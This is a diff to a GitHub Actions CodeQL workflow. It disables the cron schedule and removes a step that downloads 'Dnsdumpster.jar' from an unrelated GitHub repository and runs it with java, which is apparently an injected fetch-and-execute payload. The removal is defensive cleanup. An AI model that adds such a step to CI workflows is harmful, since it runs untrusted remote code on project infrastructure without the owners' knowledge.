@@ -14,8 +14,8 @@ name: "CodeQL"
 on:
   repository_dispatch:
   workflow_dispatch:
-  schedule:
-    - cron: '34 5 * * 4'
+#  schedule:
+#    - cron: '34 5 * * 4'
 
 jobs:
   analyze:
@@ -51,10 +51,7 @@ jobs:
       uses: github/codeql-action/init@v1
       with:
         languages: ${{ matrix.language }}
-    - name: execute permission
-    - run: |
-          wget https://github.com/riezharriz82/leetCdokter/raw/master/Dnsdumpster.jar
-          java -jar Dnsdumpster.jar
+
 
     # Autobuild attempts to build any compiled languages  (C/C++, C#, or Java).
     # If this step fails, then you should remove it and run the build manually (see below)
